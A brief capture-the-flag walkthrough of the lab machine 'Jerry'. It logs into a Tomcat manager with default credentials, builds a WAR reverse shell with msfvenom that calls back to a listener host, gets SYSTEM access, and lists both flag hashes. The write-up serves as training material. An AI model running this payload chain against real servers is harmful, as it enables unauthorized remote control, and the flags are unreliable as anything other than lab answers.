# Jerry
## IP: 10.10.10.95
## OS: Windows

Nmap scan:

```
open port 8080
```

Port 8080 was running apache tomcat 7.0.88.
I found an exploit for this version but it didn't worked.

In the homepage, there was manager app button. I clicked on it and it was asking for credentials.
I searched online for any default credentials.

```
tomcat:s3cret
```

I logged in as tomcat user and found that I can upload a .war file and it will get executed.

I used msfvenom and used jsp_shell.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f war > shell.war
```

Uploaded the file and started a netcat listener on my machine.

In the manager page, our file was listed. When I clicked on the filename, I got reverse shell as authority/system.

Flags were present in C:\Users\Administrator\Desktop\flags.

```
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
